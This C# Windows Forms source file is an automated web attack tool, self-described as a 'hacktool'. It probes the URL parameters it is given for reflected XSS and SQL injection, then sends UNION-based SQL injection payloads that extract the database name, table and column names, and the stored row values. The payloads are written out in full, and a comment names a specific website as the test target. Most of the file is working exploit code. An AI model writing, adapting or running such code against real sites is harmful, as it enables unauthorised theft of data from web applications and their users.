using System;
using System.Collections.Generic;
using System.ComponentModel;
#region Imports
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
#endregion
/// <summary>
/// BruteForce1 is a namespace that contains <see cref="From1"> and all related component methods and interactions
/// It also contains a method that creates a instance of <see cref="From1"> with instances given in contruction 
/// </summary>
///<remarks>
/// All code held inside Bruteforce1 namespace
/// </remarks>
namespace Bruteforce1
{
    ///<summary>
    ///Form1 is an object that deals with  both the 'physical' GUI of the hacktool.<para />
    ///Form1 also contains the internal hacking code (See <see cref="button1_Click(object, EventArgs)"/>)
    ///</summary>

    public partial class Form1 : Form
    {
        /// <summary>
        /// Constructior of the <see cref="From1">  object. 
        /// <para> <code> Calls a simple <para/> InitializeComponent(); </code></para>
        /// </summary>
        public Form1()
        {
            InitializeComponent();
        }
        #region Null Code
        /// <summary>
        /// Unused click function for the first label, kept for further development purposes
        /// </summary>
        /// <param name="sender"> The object that send thw click event. Unsued but required for method</param>
        /// <param name="e">A refrence to the instance of the click event.</param>
        private void label1_Click(object sender, EventArgs e)
        {

        }
        ///<summary>
        ///Unsued code, good to have for further development
        ///</summary>

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        #endregion
        /// <summary>
        /// The method that runs when the button is pressed in the application.
        /// It takes a hard coded HTTP url with GET method parameters, cleanses that URL down to the passed
        /// values.<para/>
        /// It then iterates through database retreival, table retreival,then column retreival,
        /// before attempting to use UNION statments to retreive hidden values in a database.
        /// <code>
        /// <para>NOTE: Currently ony works on single table databases in GET statments with 3 parameters</para>
        /// </code>
        /// </summary>
        /// <param name="sender"> The object that send thw click event. Unsued but required for method</param>
        /// <param name="e">A refrence to the instance of the click event.</param>
        private void button1_Click(object sender, System.EventArgs e)
        {
            //TESTQUERIES
            //" http://www.starshiplad.com/sendit.php?name=HackTest+take3&info=Bad+information"
            //http://www.starshiplad.com/search.php?testsearch=REEE
            #region Variable housekeeping
            //HOUSEKEEPIGN AND VARIABLE INITALIZATION
            Boolean sQLValid = false;
            string url = textBox.Text;
            int index = url.IndexOf('?');
            int i = 0;
            string[] urlParameters = url.Remove(0, index + 1).Split('&');
            string[] phonyrequests = new String[urlParameters.Length];
            string databaseName = "";
            string[] varNames= { };
            string tablename = "";
            String output = "";
            StreamReader reader = null;
            #endregion

            foreach (string p in urlParameters)
            {
                output += "\r\r\n Testing Parameter" + i + " : " + p;
                //Run to test for XSS vunrability for each parameter
                output += "-------------XSS--------------\r\n";
                phonyrequests[i] = url.Replace(p, p + "<xss>");
                output += "Attempted to send: " + phonyrequests[i] + "\r\n \r\n";
                HttpWebRequest webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                string response = "";
                webRequest.Method = "GET";
                reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                response = reader.ReadToEnd();
                output += "-------------XSS RESPONSE--------------\r\n";
                if (response.Contains("<xss>"))
                {
                    output += "XSS vunrability in param " + p + "\r\n";
                }

                //Repeat for SQL injection
                output += "-------------SQL--------------\r\n";
                phonyrequests[i] = url.Replace(p, p + "badinfo;");
                output += "\r\n Attempted to send: " + phonyrequests[i] + "\r\n \r\n";
                webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                webRequest.Method = "GET";
                response = "";

                reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                response = reader.ReadToEnd();
                output += "\r\n-------------SQL RESPONSE--------------\r\n";
                if (response.Contains("badinfo;"))
                {

                    output += "SQL injection vunrability in param " + p + "\r\n";
                    sQLValid = true;

                }

                //Add HACK CODE
                //0x6861636B = 'hack'
                //TODO : For some reason, SQL injections when testing (if sqlValid= true) don't work. 
                if (true)
                {

                    output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET DATABASE NAME--------------\r\n";
                    output += "\r\n" + p + " is parameter being infected\r\n";
                    //Basic insert statemnt
                    //phonyrequests[i] = url.Replace(p, p + "bad+info'+UNION+ALL+SELECT+NULL,NULL,CONCAT(0x6861636B,DATBASE(),0x6861636B),NULL#");
                    //Only operate on first parameter to save on textspace in labels
                    if (i == 0)
                    {
                        //RETREIVE DATABASE NAMES
                        //Do so by using regex statments to elect groups seperated by self-inserted 'hack'
                        phonyrequests[i] = url.Replace(p, p + "info'+UNION+ALL+SELECT+CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack'),CONCAT('hack',DATABASE(),'hack') %23");
                        output += "\r\n sent " + phonyrequests[i];
                        ///<summary>
                        ///Matches is the one-fit variable for the current text to be retreived from the databse, be it table names or variable names
                        ///<para>  Matches is an array of all regex searches that returned vali groups searched for</para>
                        /// </summary>
                        MatchCollection matches;
                        Regex regexVar;
                        try
                        {
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd();

                            //Create regex to retreive database name

                            regexVar = new Regex("hack" + "(.*?)" + "hack");
                            matches = regexVar.Matches(response);
                            foreach (Match m in matches)
                            {
                                if (!databaseName.Equals(m.Groups[1].Value))
                                {
                                    output += "\r\nChanged dbname from " + databaseName + " to " + m.Groups[1].Value;
                                    databaseName = m.Groups[1].Value;
                                }

                            }
                            output += "\r\n ----- DATABASE NAME IS :" + databaseName + "\r\n";
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }
                        try
                        {
                            //RETREIVE TABLE NAMES
                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE NAMES-------------\r\n";
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+TABLE_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_TYPE+%3D+%27BASE+TABLE%27+AND+TABLE_SCHEMA%3D %27" + databaseName + "%27%23");
                            output += "\r\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd();
                            //Create regex to retreive database name
                            regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                            matches = regexVar.Matches(response);
                            varNames = new string[matches.Count];
                            int x = 0;
                            foreach (Match m in matches)
                            {
                                if( !m.Groups[1].Value.Equals("") && x==3)
                                {

                                    tablename = m.Groups[1].Value;
                                }
                                x++;

                            }
                            x = 0;
                            output += "\r\n ----- TABLE NAME IS :" + tablename+ "\r\n";
                        }
                        //If database unconnected, 
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }
                        try
                        {
                            //RETREIVE COLUMN NAMES
                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S COLUMN-------------\r\n";
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+COLUMN_NAME%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema%3D%27" + databaseName + "%27 %23");
                            output += "\r\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd();
                            //Create regex to retreive database name
                            regexVar = new Regex("<tr><td>" + "(.*?)" + "</td>");
                            matches = regexVar.Matches(response);
                            varNames = new string[matches.Count];
                            int x = 0;
                            foreach (Match m in matches)
                            {
                                if (!"".Equals(m.Groups[1].Value))
                                {
                                    output += "\r\n Found Column Called [[[" + m.Groups[1].Value + "]]]\r\n";
                                    varNames[x] = m.Groups[1].Value;
                                    x++;
                                }

                            }
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }

                        try
                        {
                            //RETREIVE '||' SEPERATED COLUMN NAMES
                            output += "\r\n-------------ATTEMPTING SQL INJECTION TO GET " + databaseName + " 'S TABLE Showing each value-------------\r\n";
                            String requestString = "";
                            int w = 0;
                            while (w < varNames.Length && w<3)
                            {
                                //Requests each variable name seperated by ' | '
                                String identityString = "' "+varNames[w]+":',";
                                requestString += identityString+varNames[w] + ",' | ',";
                                output += "Variable" + w + " is " + varNames[w] +" request is "+requestString;
                                w++;
                            }
                            requestString = requestString.Substring(0,requestString.Length-1);
                            phonyrequests[i] = url.Replace(p, p + "info%27+UNION+ALL+SELECT+CONCAT('hack',"+requestString+",'hack'),NULL,NULL+FROM+"+tablename+"%23");
                            output += "\r\n sent :" + phonyrequests[i];
                            webRequest = (HttpWebRequest)HttpWebRequest.Create(phonyrequests[i]);
                            reader = new StreamReader(webRequest.GetResponse().GetResponseStream());
                            response = reader.ReadToEnd();
                            //Create regex to retreive database name
                            regexVar = new Regex("hack" + "(.*?)" + "hack");
                            matches = regexVar.Matches(response);
                            foreach (Match m in matches)
                            {
                                if (!"".Equals(m.Groups[1].Value))
                                {
                                    output += "\r\n Found Information Called [[[" + m.Groups[1].Value + "]]]\r\n";
                                    databaseName = m.Groups[1].Value;
                                }

                            }
                        }
                        catch (Exception se)
                        {
                            output += "Error connecting: " + se.Message;
                        }


                    }
                    else
                    {
                        output += "\r\n N0t first parameter\r\n";
                    }




                }
                i++;
                //Update text as what is written in 'output'
                label1.Text = output;


                //LEGACY CODE
                /*
                 *   int search = 0;
                while ((response.IndexOf('h', search)) != -1)
                {
                    if (response.Substring(search, search + 4).Equals("hack"))
                    {
                        databaseName = response.Substring(search + 4, response.IndexOf('h', search));
                        break;
                    }
                    else
                    {
                        output=response +"Search is " + search + " \r\n";
                        label1.Text = output;
                        Update();
                        search = response.IndexOf('h', search);
                    }

                }
                output += "\r\n DATABASENAME : " + databaseName + "\r\n \r\n \r\n ";
                */
                //END HACK CODE

            }


        }
        
    }
}
